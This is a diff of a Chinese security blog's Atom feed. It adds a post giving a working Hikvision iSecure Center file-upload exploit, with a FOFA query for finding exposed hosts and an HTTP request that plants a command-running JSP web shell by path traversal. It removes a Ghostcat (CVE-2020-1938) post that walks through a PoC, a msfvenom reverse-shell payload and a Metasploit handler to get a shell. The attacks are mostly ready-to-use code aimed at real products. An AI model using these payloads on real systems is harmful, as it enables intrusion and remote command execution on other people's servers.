@@ -1,4 +1,36 @@
-<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="4.3.2">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2023-11-21T11:47:25+08:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">Yueyejian’s Blog</title><subtitle>Write an awesome description for your new site here. You can edit this line in _config.yml. It will appear in your document head meta (for Google search results) and in your feed.xml site description.</subtitle><author><name>yueyejian</name></author><entry><title type="html">Nacos身份认证绕过漏洞</title><link href="http://localhost:4000/vul/nacos/" rel="alternate" type="text/html" title="Nacos身份认证绕过漏洞" /><published>2023-11-21T00:00:00+08:00</published><updated>2023-11-21T00:00:00+08:00</updated><id>http://localhost:4000/vul/nacos</id><content type="html" xml:base="http://localhost:4000/vul/nacos/"><![CDATA[<h1 id="nacos身份认证绕过漏洞">Nacos身份认证绕过漏洞</h1>
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="4.3.2">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2023-11-22T17:02:27+08:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">Yueyejian’s Blog</title><subtitle>Write an awesome description for your new site here. You can edit this line in _config.yml. It will appear in your document head meta (for Google search results) and in your feed.xml site description.</subtitle><author><name>yueyejian</name></author><entry><title type="html">Hikvision综合安防管理平台文件上传</title><link href="http://localhost:4000/vul/hikvision/" rel="alternate" type="text/html" title="Hikvision综合安防管理平台文件上传" /><published>2023-11-22T00:00:00+08:00</published><updated>2023-11-22T00:00:00+08:00</updated><id>http://localhost:4000/vul/hikvision</id><content type="html" xml:base="http://localhost:4000/vul/hikvision/"><![CDATA[<p>想要成为红队大佬，复现漏洞少不了</p>
+
+<p><img src="/images/vul/hikvision/1.png" alt="" /></p>
+
+<p>fofa查询语句：<code class="language-plaintext highlighter-rouge">icon_hash="-808437027" &amp;&amp; app="HIKVISION-iSecure-Center"</code></p>
+
+<p>如果凭拼接<code class="language-plaintext highlighter-rouge">/center/api/files;.js</code>后如下图响应，则漏洞很大可能存在</p>
+
+<p><img src="/images/vul/hikvision/2.png" alt="" /></p>
+
+<p>上传木马</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>POST /center/api/files;.js HTTP/1.1
+Host: xxx.xxx.xxx.xxx
+Accept-Encoding: gzip, deflate
+Accept: */*
+Connection: close
+Content-Length: 539
+Content-Type: multipart/form-data; boundary=e54e7e5834c8c50e92189959fe7227a4
+
+--e54e7e5834c8c50e92189959fe7227a4
+Content-Disposition: form-data; name="file"; filename="../../../../../bin/tomcat/apache-tomcat/webapps/clusterMgr/shell.jsp"
+Content-Type: application/octet-stream
+
+&lt;% if("yueyejian".equals(request.getParameter("pwd"))){ java.io.InputStream in = Runtime.getRuntime().exec(request.getParameter("cmd")).getInputStream(); int a = -1; byte[] b = new byte[2048]; out.print("&lt;pre&gt;"); while((a=in.read(b))!=-1){ out.println(new String(b)); } out.print("&lt;/pre&gt;"); } %&gt;
+--e54e7e5834c8c50e92189959fe7227a4--
+</code></pre></div></div>
+
+<p><img src="/images/vul/hikvision/3.png" alt="" /></p>
+
+<p>拼接<code class="language-plaintext highlighter-rouge">/clusterMgr/[文件名];.js</code>可访问</p>
+
+<p><img src="/images/vul/hikvision/4.png" alt="" /></p>]]></content><author><name>yueyejian</name></author><category term="vul" /><category term="hikvision" /><category term="nday" /><category term="web" /><summary type="html"><![CDATA[想要成为红队大佬，复现漏洞少不了]]></summary></entry><entry><title type="html">CVE-2021-29441 - Nacos身份认证绕过漏洞</title><link href="http://localhost:4000/vul/nacos/" rel="alternate" type="text/html" title="CVE-2021-29441 - Nacos身份认证绕过漏洞" /><published>2023-11-21T00:00:00+08:00</published><updated>2023-11-21T00:00:00+08:00</updated><id>http://localhost:4000/vul/nacos</id><content type="html" xml:base="http://localhost:4000/vul/nacos/"><![CDATA[<h1 id="nacos身份认证绕过漏洞">Nacos身份认证绕过漏洞</h1>
 <h2 id="0x00-漏洞概述">0x00 漏洞概述</h2>
 <p>Nacos是阿里巴巴推出来的一个新开源项目，是一个更易于构建云原生应用的动态服务发现、配置管理和服务管理平台。User-Agent为<code class="language-plaintext highlighter-rouge">Nacos-Server</code>时可绕过认证，添加新用户。</p>
 
@@ -1359,95 +1391,4 @@ root@holiday:/root# <span class="nb">cat </span>root.txt
 <h2 id="小结">小结</h2>
 <p>这是我pawd的第一台hackthebox靶机，看到这个界面心里难免有些激动，虽然是看walkthrough做出来的，但是也花了大概一两天的时间拿下靶机以及完成记录。就当做是一个新的开始吧！走起~</p>
 
-<p><img src="/images/hackthebox/holiday/14.png" alt="" /></p>]]></content><author><name>yueyejian</name></author><category term="[&quot;hack-the-box&quot;]" /><category term="node" /><category term="linux" /><category term="web" /><category term="sqli" /><category term="xss" /><category term="rce" /><category term="privilege-escalation" /><summary type="html"><![CDATA[HackTheBox - Holiday About Holiday Holiday is definitely one of the more challenging machines on HackTheBox. It touches on many different subjects and demonstrates the severity of stored XSS, which is leveraged to steal the session of an interactive user. The machine is very unique and provides an excellent learning experience.]]></summary></entry><entry><title type="html">CVE-2020-1938 - Ghostcat</title><link href="http://localhost:4000/vul/CVE-2020-1938/" rel="alternate" type="text/html" title="CVE-2020-1938 - Ghostcat" /><published>2023-04-16T00:00:00+08:00</published><updated>2023-04-16T00:00:00+08:00</updated><id>http://localhost:4000/vul/CVE-2020-1938</id><content type="html" xml:base="http://localhost:4000/vul/CVE-2020-1938/"><![CDATA[<h1 id="cve-2020-1938---ghostcat">CVE-2020-1938 - Ghostcat</h1>
-<h2 id="0x00-漏洞概述">0x00 漏洞概述</h2>
-<p>Java 是目前 Web 开发中主流的编程语言，而 Tomcat 是当前流行的 Java 中间件服务器之一，从初版发布到现在已经有二十多年历史，在世界范围内广泛使用。</p>
-
-<p>Ghostcat 是由长亭发现的存在于 Tomcat 中的漏洞，由于 Tomcat AJP 协议设计上存在缺陷，攻击者通过 Tomcat AJP Connector 可以读取或包含 Tomcat 上所有 webapp 目录下的任意文件，例如可以读取 webapp 配置文件或源代码。此外在目标应用有文件上传功能的情况下，配合文件包含的利用还可以达到远程代码执行的危害。</p>
-<h2 id="0x01-影响范围">0x01 影响范围</h2>
-
-<p><strong>Tomcat 9.x &lt; 9.0.31</strong>
-<strong>Tomcat 8.x &lt; 8.5.51</strong>
-<strong>Tomcat 7.x &lt; 7.0.100</strong>
-<strong>Tomcat 6.x</strong></p>
-
-<h2 id="0x02-环境搭建vulhub">0x02 环境搭建（vulhub）</h2>
-
-<p><img src="/images/vulhub/CVE-2020-1938/0.jpg" alt="" /></p>
-
-<h2 id="0x03-漏洞检测">0x03 漏洞检测</h2>
-
-<p>8009端口开放ajp协议</p>
-
-<p><img src="/images/vulhub/CVE-2020-1938/1.jpg" alt="" /></p>
-
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code># 获取poc
-wget https://github.com/YDHCUI/CNVD-2020-10487-Tomcat-Ajp-lfi/archive/refs/heads/master.zip 
-# 解压
-unzip master.zip
-# 执行poc
-python CNVD-2020-10487-Tomcat-Ajp-lfi.py 43.xx.xx.37 -p 8009 -f WEB-INF/web.xml
-</code></pre></div></div>
-
-<p>成功读取到了服务器的/usr/local/tomcat/webapps/ROOT/WEB-INF/web.xml文件</p>
-
-<p><img src="/images/vulhub/CVE-2020-1938/2.jpg" alt="" /></p>
-
-<h2 id="0x04-漏洞利用">0x04 漏洞利用</h2>
-
-<p>安装msf</p>
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb &gt; msfinstall 
-chmod 755 msfinstall 
-./msfinstall
-</code></pre></div></div>
-<p>使用msf生成反弹shell的jsp马，因为是文件包含漏洞，所以文件类型不用管</p>
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>msfvenom -p java/jsp_shell_reverse_tcp LHOST=[ip] LPORT=[port] R &gt;ma.png
-</code></pre></div></div>
-<p>然后模仿网站的文件上传功能，把马放到网站目录里去</p>
-
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>docker cp ma.png 1cf744b0f648:/usr/local/tomcat/webapps/ROOT/WEB-INF/
-</code></pre></div></div>
-
-<p>开启msf的监听</p>
-
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>msfconsole # 进入msf
-use exploit/multi/handler
-show options
-set payload java/jsp_shell_reverse_tcp
-set lhost x.x.x.x
-set lport x
-exploit
-</code></pre></div></div>
-<p>然后又用刚才的脚本读取了一波服务器下存在的ma.png文件</p>
-
-<p><img src="/images/vulhub/CVE-2020-1938/3.jpg" alt="" /></p>
-
-<p>发现读取成功了，但是msf那边却没有反应，难道是脚本的问题？只进行了文件读取，而不是文件包含吗。尝试变换思路，下载AJP包构造器ajpfuzzer</p>
-
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>wget https://github.com/doyensec/ajpfuzzer/releases/download/v0.6/ajpfuzzer_v0.6.jar
-</code></pre></div></div>
-
-<p>ok 下好了之后运行</p>
-
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>java -jar ajpfuzzer_v0.6.jar
-</code></pre></div></div>
-<p>连接目标端口</p>
-
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>connect [ip] [port]
-</code></pre></div></div>
-
-<p>构造发送AJP包的命令，[ip] [port] 为目标机器的ip和端口号，/WEB-INF/ma.png为上传的木马路径，11.jsp 可换做 *.jsp，任意网站目录下不存在的jsp文件，这样tomcat才会去调用DefaultServlet</p>
-
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>forwardrequest 2 "HTTP/1.1" "/11.jsp" [ip] [ip] porto 8009 false "Cookie:AAAA=BBBB","Accept-Encoding:identity" "javax.servlet.include.request_uri:11.jsp","javax.servlet.include.path_info:/WEB-INF/ma.png","javax.servlet.include.servlet_path:/"
-</code></pre></div></div>
-
-<p><img src="/images/vulhub/CVE-2020-1938/4.jpg" alt="" /></p>
-
-<p>发送ajp请求后，ma.png文件被tomcat作为jsp文件解析，成功getshell</p>
-
-<p><img src="/images/vulhub/CVE-2020-1938/5.jpg" alt="" /></p>
-
-<h2 id="0x05-参考">0x05 参考</h2>
-<p>https://www.chaitin.cn/zh/ghostcat</p>
-
-<p>https://mp.weixin.qq.com/s?__biz=MzUyNDk0MDQ3OQ==&amp;mid=2247485009&amp;idx=1&amp;sn=5f619c27ec994949f5fa69d41d2dee05&amp;chksm=fa24e381cd536a972db2cc5a5fc09be33a7833f1caa6440bb5979d3d7ea052384645fbd2b62c&amp;mpshare=1&amp;scene=23&amp;srcid=&amp;sharer_sharetime=1584439554350&amp;sharer_shareid=1f92b9e8670fffeb7eea157894e3536a#rd</p>]]></content><author><name>yueyejian</name></author><category term="[&quot;vul&quot;]" /><category term="tomcat" /><category term="web" /><category term="ajp" /><category term="lfi" /><summary type="html"><![CDATA[CVE-2020-1938 - Ghostcat 0x00 漏洞概述 Java 是目前 Web 开发中主流的编程语言，而 Tomcat 是当前流行的 Java 中间件服务器之一，从初版发布到现在已经有二十多年历史，在世界范围内广泛使用。]]></summary></entry></feed>
+<p><img src="/images/hackthebox/holiday/14.png" alt="" /></p>]]></content><author><name>yueyejian</name></author><category term="[&quot;hack-the-box&quot;]" /><category term="node" /><category term="linux" /><category term="web" /><category term="sqli" /><category term="xss" /><category term="rce" /><category term="privilege-escalation" /><summary type="html"><![CDATA[HackTheBox - Holiday About Holiday Holiday is definitely one of the more challenging machines on HackTheBox. It touches on many different subjects and demonstrates the severity of stored XSS, which is leveraged to steal the session of an interactive user. The machine is very unique and provides an excellent learning experience.]]></summary></entry></feed>
